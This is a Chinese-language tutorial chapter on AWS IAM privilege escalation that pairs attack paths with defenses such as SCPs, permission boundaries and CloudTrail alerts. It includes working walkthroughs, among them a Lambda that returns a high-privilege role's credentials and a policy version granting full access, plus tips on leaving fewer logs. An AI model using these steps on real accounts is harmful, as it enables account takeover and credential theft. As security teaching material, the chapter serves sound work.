# Ch 7 — IAM 提權技術：從低權限到 AdministratorAccess

> **目標**：掌握 AWS IAM 的 21 條（以上）提權路徑核心邏輯；能看著一組 IAM 權限判斷是否存在提權路徑；能手動重現 PassRole → Lambda 鏈並理解每個環節的防禦盲點。

---

## 為什麼這章是重點

拿到一組 AWS 憑證不代表遊戲結束——也不代表遊戲沒結束。

IAM 提權（privilege escalation）的特殊性在於：**不需要漏洞，完全利用 AWS 設計上的正常功能**。如果你能把一個高權限 Role 交給 Lambda 執行，那 Lambda 代表的就是那個 Role，而不是你。你沒有直接「拿到」admin，但你能執行任何 admin 能做的操作——差別在哪裡？

這讓傳統防禦思維失效：IDS 看不到「漏洞利用」，CloudTrail 看到的是合法的 API 呼叫，告警門檻難以設定。

Rhino Security Labs 在 2018 年整理出 21 條提權路徑，核心邏輯都是一樣的：**找到一個能讓你間接獲得更高權限的 IAM 操作**。

---

## 先建直覺：權限圖找路

把 AWS 帳號的權限結構想成一張有向圖（directed graph）。每個 IAM 動作是一條邊，每個 Identity（User / Role）是一個節點。提權就是在這張圖裡找一條從「你現在的身分」到「admin 節點」的路徑。

```
   你現在的身分 (dev-bot, 低權限)
         │
         ├── iam:PassRole ────────────► high-priv-role (AdministratorAccess)
         │        └── lambda:CreateFunction + lambda:InvokeFunction
         │              └── 建 Lambda 掛 high-priv-role → Invoke → 拿到 STS 憑證
         │
         ├── iam:CreatePolicyVersion ─► 把你已擁有的 policy 改成 Action:* / Resource:*
         │        └── iam:SetDefaultPolicyVersion ─► 讓新版本生效
         │
         ├── iam:AttachUserPolicy ────► 直接把 AdministratorAccess 附到自己身上
         │
         ├── iam:CreateAccessKey ─────► 對其他 admin IAM User 建立 Access Key
         │
         ├── iam:UpdateAssumeRolePolicy► 修改 high-priv-role 的 trust policy → AssumeRole
         │
         └── iam:CreateLoginProfile ──► 對無密碼 admin User 建立 console 密碼 → 登入
```

關鍵洞察：**任何能「讓服務代替你執行」或「修改你擁有之物」的動作，都可能是提權邊**。

---

## 底層機制：IAM 授權模型的設計邊界

### PassRole 的存在原因

AWS 服務（Lambda、EC2、Glue、ECS…）執行時需要一個 IAM Role 來呼叫 AWS API。但「誰決定這個 Role？」——是呼叫者（你）在建立資源時指定的。

`iam:PassRole` 就是「我允許你把某個 Role 交給服務使用」的許可。沒有 PassRole，你無法指定 Lambda 的執行 Role，無法替 EC2 設定 Instance Profile。

這個設計的問題：**PassRole 本身不限制你能不能存取那個 Role 的實際權限**。你可以把一個你根本沒有存取權的 AdministratorAccess Role 交給 Lambda，然後透過 Lambda 執行 admin 操作。

### Policy Version 系統

Customer Managed Policy（客戶自建的 policy）最多可以有 5 個版本（v1~v5）。`iam:CreatePolicyVersion` 允許你新增一個版本；`iam:SetDefaultPolicyVersion` 決定哪個版本生效。

如果你擁有的 policy 目前是「ReadOnly」，你可以用 CreatePolicyVersion 新增一個 `Action: *` 的版本然後設為預設——完全不需要碰到其他帳號資源。

### Trust Policy vs. Permission Policy

Role 有兩份 policy：
- **Permission Policy**：這個 Role 能做什麼
- **Trust Policy（Assume Role Policy）**：誰可以呼叫 `sts:AssumeRole` 扮演這個 Role

`iam:UpdateAssumeRolePolicy` 允許你修改 Trust Policy——把你的 Identity 加進去，然後 AssumeRole 進去。

---

## 七條核心提權路徑

### 路徑一：iam:PassRole + 服務濫用（最常見）

**所需權限**：
```
iam:PassRole（針對 high-priv-role）
lambda:CreateFunction
lambda:InvokeFunction
```

**攻擊邏輯**：建立 Lambda，指定高權限 Role，Lambda 執行時的身分是那個 Role，在 Lambda 裡把環境變數裡的 STS 憑證回傳給你。

同樣的 PassRole 路徑可以接 EC2（RunInstances + 之後 SSH 進去）或 Glue（CreateJob + StartJobRun）。Lambda 最省事因為你不需要等機器起來，也不需要 inbound 存取權。

**防禦**：PassRole 應綁定 `iam:PassedToService` condition，限制只能 pass 給特定服務，且目標 Role ARN 應明確指定而不是 `*`。

---

### 路徑二：iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion

**所需權限**：
```
iam:CreatePolicyVersion（針對某個附加到你自己的 policy ARN）
iam:SetDefaultPolicyVersion（同上）
```

**攻擊邏輯**：找出附加到你的 User 或 Group 的 Customer Managed Policy，用 CreatePolicyVersion 新增一個 `Action: * / Resource: *` 的版本，再用 SetDefaultPolicyVersion 設為 default。

限制：**只能修改 Customer Managed Policy，不能修改 AWS Managed Policy**（如 `arn:aws:iam::aws:policy/...`）。

---

### 路徑三：iam:AttachUserPolicy / iam:AttachRolePolicy

**所需權限**：
```
iam:AttachUserPolicy（或 iam:AttachRolePolicy）
```

**攻擊邏輯**：直接對自己的 User 或 Role 附加 `AdministratorAccess`。最直接，也是 CloudTrail 最顯眼的路徑——一條 `AttachUserPolicy` 事件就把你賣了。

---

### 路徑四：iam:CreateAccessKey

**所需權限**：
```
iam:CreateAccessKey（針對其他 IAM User）
```

**攻擊邏輯**：先透過 Ch 6 的枚舉找到有 admin 權限的 IAM User，呼叫 `aws iam create-access-key --user-name admin-user`，拿到該 User 的新 Access Key 直接使用。

限制：每個 IAM User 最多 2 組 Access Key；如果目標 User 已有 2 組，這個呼叫會失敗。

---

### 路徑五：iam:UpdateAssumeRolePolicy

**所需權限**：
```
iam:UpdateAssumeRolePolicy（針對某個高權限 Role）
sts:AssumeRole
```

**攻擊邏輯**：修改目標 Role 的 Trust Policy，把你現在的 User ARN 或 Role ARN 加進 `Principal`，然後直接 AssumeRole 進去。

---

### 路徑六：sts:AssumeRole（直接路徑）

**所需權限**：
```
sts:AssumeRole（且目標 Role 的 Trust Policy 已信任你）
```

**攻擊邏輯**：不需要任何 iam: 操作。有些 Trust Policy 寫得太寬鬆（信任整個帳號 `arn:aws:iam::123456789012:root`，意思是「帳號內任何 Identity 都可以 assume」），或者明確信任了你現在的 Role ARN。直接嘗試就好。

這不是「提權漏洞」，是「設定錯誤」。但效果相同。

---

### 路徑七：iam:CreateLoginProfile

**所需權限**：
```
iam:CreateLoginProfile（針對某個 IAM User）
```

**攻擊邏輯**：AWS IAM User 可以有 Access Key（程式存取）和 Console Password（網頁登入）兩種憑證，彼此獨立。有些高權限 User 只有 Access Key 沒有 Console Password。用 `CreateLoginProfile` 幫它建一個密碼，然後用那個 User 的名字和你設定的密碼登入 AWS Console。

Console 登入有時比 API 更難被工具偵測，這條路徑在 purple team 演練中常被低估。

---

### 路徑八：SSM 服務鏈（簡述）

**所需權限**：
```
ssm:SendCommand（針對某個 EC2）
```

如果那台 EC2 的 Instance Role 有高權限，`ssm:SendCommand` 讓你在 EC2 上執行任意指令——等於拿到了那個 Instance Role 的權限。

更長的鏈：`iam:PassRole` + `ec2:RunInstances`（建立附有高權限 Role 的 EC2）+ `ssm:SendCommand`（在那台機上執行，拿到 instance metadata 的 STS 憑證）。

---

## 具體可跑範例

### 範例一：PassRole → Lambda 提權（完整）

首先，確認你目前的低權限 policy 允許下列動作（這是有問題的 policy 設定）：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DangerousDevPolicy",
            "Effect": "Allow",
            "Action": [
                "iam:PassRole",
                "lambda:CreateFunction",
                "lambda:InvokeFunction",
                "lambda:GetFunction"
            ],
            "Resource": "*"
        }
    ]
}
```

第一步：準備 Lambda 程式碼，功能是把執行時的 STS 憑證回傳。

```python
# lambda_function.py
import boto3
import json

def lambda_handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()

    # 從環境變數拿 STS 憑證（Lambda 執行時自動注入）
    session = boto3.session.Session()
    creds = session.get_credentials().get_frozen_credentials()

    return {
        'identity': identity['Arn'],
        'AccessKeyId': creds.access_key,
        'SecretAccessKey': creds.secret_key,
        'SessionToken': creds.token
    }
```

打包成 zip（Lambda 要求）：

```bash
zip function.zip lambda_function.py
```

第二步：用低權限 dev-bot 的憑證，把這個 Lambda 建起來，但掛上高權限 Role。

```bash
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_DEFAULT_REGION=us-east-1

# 建立 Lambda，role 指向高權限 Role（dev-bot 沒有這個 Role 的存取權，但有 PassRole）
aws lambda create-function \
  --function-name privesc-test \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/high-priv-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip
```

預期輸出（Lambda 建立成功）：

```json
{
    "FunctionName": "privesc-test",
    "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:privesc-test",
    "Runtime": "python3.11",
    "Role": "arn:aws:iam::123456789012:role/high-priv-role",
    "Handler": "lambda_function.lambda_handler",
    "State": "Pending"
}
```

等 Lambda 狀態變 Active（約 5-10 秒），然後 Invoke：

```bash
aws lambda invoke \
  --function-name privesc-test \
  --payload '{}' \
  output.json

cat output.json
```

預期輸出（拿到 high-priv-role 的 STS 憑證）：

```json
{
    "identity": "arn:aws:sts::123456789012:assumed-role/high-priv-role/privesc-test",
    "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "SessionToken": "IQoJb3JpZ2luX2VjEJr..."
}
```

第三步：用這組 STS 憑證驗證身分：

```bash
export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEJr...

aws sts get-caller-identity
# 回傳: high-priv-role 的 assumed-role ARN
```

**本段未實測，為理論預期行為**。自驗方法：在你自己的 AWS 測試帳號建立 `dev-bot` User 和 `high-priv-role` Role（給 AdministratorAccess），照上面步驟跑，確認 output.json 裡的身分是 high-priv-role 而不是 dev-bot。

---

### 範例二：CreatePolicyVersion 直接改自己的 Policy

假設你的 User 附有 ARN 為 `arn:aws:iam::123456789012:policy/dev-readonly` 的 Customer Managed Policy，且你有 `iam:CreatePolicyVersion` 和 `iam:SetDefaultPolicyVersion` 權限。

準備爆炸性的新版本 policy（結構上合法的 JSON）：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "FullAccess",
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
```

把它存成 `full-access.json`，然後建立新版本並設為 default：

```bash
# 建立新版本（AWS 自動分配版本號，這裡會是 v2、v3 之類）
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/dev-readonly \
  --policy-document file://full-access.json \
  --set-as-default
```

`--set-as-default` 旗標讓 create 和 set-default 合成一個呼叫，只產生一個 CloudTrail 事件而不是兩個。

驗證是否生效：

```bash
aws iam get-caller-identity
# 然後嘗試一個原本沒有的操作
aws s3 ls  # 如果現在成功，代表提權成功
```

**本段未實測，為理論預期行為**。自驗方法：在測試帳號建立 Customer Managed Policy 並附給 User，執行上述步驟，確認 policy version list 裡新版本是 default。

---

### 範例三（失敗案例）：有 PassRole 但沒有 lambda:CreateFunction

```bash
# 只有 iam:PassRole，沒有 lambda:CreateFunction 時嘗試建 Lambda
aws lambda create-function \
  --function-name privesc-test \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/high-priv-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip
```

AWS 回傳：

```
An error occurred (AccessDeniedException) when calling the CreateFunction operation:
User: arn:aws:iam::123456789012:user/dev-bot is not authorized to perform:
lambda:CreateFunction on resource: arn:aws:lambda:us-east-1:123456789012:function:privesc-test
```

這個錯誤在 IAM 授權階段就失敗——Lambda 控制平面在建立 function 之前先驗你的 `lambda:CreateFunction` 權限。PassRole 允許你「指定 Role」，但不允許你「建立 Lambda」——**這兩個權限必須同時存在才能形成攻擊鏈**。

類比：你有「把鑰匙交給司機」的權力（PassRole），但你沒有「叫車」的權力（CreateFunction）——車永遠不會開來。

---

## 對比取捨表

| 提權路徑 | 所需關鍵權限 | CloudTrail 事件數 | 可偵測性 | 需要額外資源 |
|---|---|---|---|---|
| PassRole + Lambda | PassRole, CreateFunction, InvokeFunction | 3 個 | 中（組合偵測） | 需建 Lambda |
| CreatePolicyVersion | CreatePolicyVersion (+ SetDefaultPolicyVersion) | 1-2 個 | 中（單事件可疑） | 無 |
| AttachUserPolicy | AttachUserPolicy | 1 個 | 高（非常顯眼） | 無 |
| CreateAccessKey | CreateAccessKey | 1 個 | 高（對他人建 key） | 無 |
| UpdateAssumeRolePolicy | UpdateAssumeRolePolicy, AssumeRole | 2 個 | 中 | 無 |
| AssumeRole（直接）| sts:AssumeRole（trust policy 配合） | 1 個 | 低（看起來正常） | 無 |
| CreateLoginProfile | CreateLoginProfile | 1 個 | 中（Console 登入） | 無 |
| SSM 鏈 | ssm:SendCommand（+ PassRole + RunInstances） | 2-4 個 | 低（命令層看不到） | 需 EC2 或已有實例 |

PassRole + Lambda 是最常用的路徑：噪音不算最低，但成功率高，而且攻擊者可以選擇在 Invoke 之後馬上刪除 Lambda，讓取證更難。

---

## 踩雷集錦

**1. PassRole 沒有服務建立權限，路徑不通**

PassRole 和服務建立權限必須同時存在。光有 `iam:PassRole` 沒有 `lambda:CreateFunction`，或者反過來，都無法完成攻擊鏈。Rhino Security Labs 的工具 Pacu 會自動做組合分析，手動審查容易遺漏。

**2. CreatePolicyVersion 對 AWS Managed Policy 無效**

AWS Managed Policy（ARN 以 `arn:aws:iam::aws:policy/` 開頭）是 AWS 擁有的，你無法對它呼叫 CreatePolicyVersion。只有 Customer Managed Policy（ARN 裡有你的帳號 ID）才能修改。確認之前先 `aws iam list-attached-user-policies` 確認 ARN 格式。

**3. PassRole 的 Resource 限制可能卡住你**

安全設定較好的帳號，PassRole 的 Resource 會指定到特定 Role ARN，而不是 `*`。如果 policy 是 `"Resource": "arn:aws:iam::123456789012:role/dev-exec-role"` 而你想 pass 的是 `high-priv-role`，呼叫會失敗並且報 AccessDenied。必須找到 PassRole 實際允許的 Role ARN 範圍。

**4. Role Trust Policy 有大小限制（2048 字元）**

`iam:UpdateAssumeRolePolicy` 修改 Trust Policy 時，如果原本的 Trust Policy 已經很長（有很多 Principal 或 Condition），加上你的 Principal 後可能超過 2048 字元上限，呼叫失敗。可以先 `aws iam get-role --role-name target-role` 查看現有 Trust Policy 的大小。

**5. CreateAccessKey 目標 User 已有 2 把 Key**

每個 IAM User 最多 2 組 Access Key。對有 2 組現有 Key 的 User 呼叫 CreateAccessKey 會得到 `LimitExceeded` 錯誤。這也是一個可以用 CreateLoginProfile 替代（如果該 User 沒有 Console Password）的時機。

---

## 防禦架構

### 危險動作清單（應列入 SCP 監控或拒絕）

以下動作在沒有充分理由時不應開放給一般工作 Role：

```
iam:PassRole
iam:CreatePolicyVersion
iam:SetDefaultPolicyVersion
iam:AttachUserPolicy
iam:AttachRolePolicy
iam:PutUserPolicy
iam:PutRolePolicy
iam:CreateAccessKey
iam:UpdateAssumeRolePolicy
iam:CreateLoginProfile
iam:UpdateLoginProfile
```

### Permission Boundaries（權限邊界）

Permission Boundary 是附加到 User 或 Role 的「最大允許範圍」——實際生效的權限是 Permission Policy 和 Permission Boundary 的**交集**，而不是聯集。

如果你強制所有新建的 User/Role 都必須帶上一個 Permission Boundary，而這個 Boundary 不含 `iam:*`，那麼就算攻擊者用 CreatePolicyVersion 把 policy 改成 `Action: *`，Boundary 還是會擋住 IAM 相關操作——打破提權鏈。

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        },
        {
            "Effect": "Deny",
            "Action": [
                "iam:*",
                "organizations:*",
                "account:*"
            ],
            "Resource": "*"
        }
    ]
}
```

這個 Boundary 允許所有服務操作但拒絕 IAM 相關操作，用 SCP 強制每個新 Role/User 都掛這個 Boundary。

### AWS IAM Access Analyzer

Access Analyzer 可以分析你的帳號內哪些資源有外部存取路徑。對提權分析來說更有用的是它的 **policy validation** 功能——它能標記出 policy 裡的過寬權限，包括 `Action: *` 和 `iam:PassRole` 搭配 `Resource: *`。

在 CI/CD pipeline 裡加入 `aws accessanalyzer validate-policy` 是成本最低的防線。

### CloudTrail 告警建議

對下列事件組合設定告警（AWS Config 或 Security Hub 都能做）：

- 任何 `iam:AttachUserPolicy` 或 `iam:AttachRolePolicy` 附加 `AdministratorAccess`
- `iam:CreatePolicyVersion` 後跟著 `iam:SetDefaultPolicyVersion`（同 User / 30 分鐘內）
- `iam:CreateAccessKey` 對象不是呼叫者自己（`userIdentity.arn != requestParameters.userName`）
- `iam:UpdateAssumeRolePolicy` 後跟著 `sts:AssumeRole`（同 User / 10 分鐘內）

---

## 進階延伸

### Pacu：AWS 提權自動化工具

Pacu 是 Rhino Security Labs 開源的 AWS exploitation 框架，有專門的 `iam__privesc_scan` 模組，它會列出你目前的權限並自動分析哪些提權路徑可行，類似 BloodHound 對 Active Directory 做的事。

```bash
pip install pacu
pacu
# 在 Pacu shell 內:
# import_keys <你的 Access Key>
# run iam__privesc_scan
```

Pacu 不執行提權，只列出路徑，讓 red team 決定要走哪條。

### CloudFox：快速查 assumable roles

```bash
cloudfox aws -p <aws-profile> assume-role
```

列出你的身分能 AssumeRole 進去的所有 Role，以及那些 Role 有什麼權限——是快速找路徑六（直接 AssumeRole）的工具。

### iam_vulnerable：提權練習環境

Bishopfox 的 `iam_vulnerable` 是 Terraform 腳本，在你的測試帳號裡自動建立所有 21 條提權路徑的易受攻擊場景，是練習上面所有路徑最有系統的方式。

```bash
git clone https://github.com/BishopFox/iam-vulnerable
cd iam-vulnerable
terraform init && terraform apply
```

建立後跟著 README 的 walkthrough 一條條跑，比單純閱讀有效很多。

---

## 本章重點整理

- IAM 提權不需要程式漏洞，利用的是「合法的 IAM 操作讓你間接獲得更高權限」
- **PassRole + 服務建立** 是最通用的路徑：把高權限 Role 交給 Lambda，然後從 Lambda 取回 STS 憑證
- **CreatePolicyVersion** 讓你能把自己擁有的 Customer Managed Policy 改成全開，注意只對客戶自建 policy 有效
- **sts:AssumeRole 直接路徑** 不需要任何 iam: 操作，只要 Trust Policy 配合，噪音最低
- 提權鏈通常需要**多個權限同時存在**——單一危險動作不夠，要看組合
- 防禦三支柱：SCP 拒絕危險 IAM 動作、Permission Boundaries 限制最大範圍、CloudTrail 告警偵測異常組合

---

## 自我檢核

- [ ] 我能說明 `iam:PassRole` 和「直接存取高權限 Role」的差異
- [ ] 我知道 PassRole + Lambda 路徑需要哪三個權限，缺一條為何不通
- [ ] 我能區分 AWS Managed Policy 和 Customer Managed Policy，知道哪種能被 CreatePolicyVersion 修改
- [ ] 我能解釋 Permission Boundary 為什麼能打斷 CreatePolicyVersion 提權鏈
- [ ] 我知道 UpdateAssumeRolePolicy 修改的是 Trust Policy 而不是 Permission Policy
- [ ] 我能列出至少五個應列入 SCP 監控的 iam: 動作

---

## 延伸閱讀

1. **Rhino Security Labs — "AWS IAM Privilege Escalation – Methods and Mitigation"**（2018, rhinosecuritylabs.com）
   完整的 21 條路徑原始來源，每條都有所需權限清單和防禦建議。本章所有路徑分類都源自這篇。

2. **BishopFox — iam-vulnerable（GitHub）**
   把 21 條路徑全部建成 Terraform 練習環境，是動手驗證本章知識最直接的方式，讀完本章馬上去跑一遍。

3. **Pacu 文件 — iam__privesc_scan module**（github.com/RhinoSecurityLabs/pacu）
   了解自動化提權掃描的實作邏輯，可以反向理解防禦應該擋哪些組合。

4. **AWS 文件 — "Permissions boundaries for IAM entities"**（docs.aws.amazon.com）
   Permission Boundary 的完整語意，包括它和 SCP、Session Policy 的優先順序關係——「有效權限 = Policy ∩ Boundary ∩ SCP ∩ Session Policy」的數學要搞清楚。

5. **CloudFox 文件 — "AWS Post-Exploitation Framework"**（github.com/BishopFox/cloudfox）
   紅隊工具的操作手冊，特別是 `assume-role` 和 `permissions` 子命令，理解工具的輸出格式有助於你在真實 engagement 中快速定位路徑。

---

本章走完了「在帳號內部的權限升級」，下一章把視野擴展到帳號邊界之外——

→ [Ch 8 跨帳號與信任攻擊：AssumeRole 與 confused deputy](./08-cross-account-trust.md)
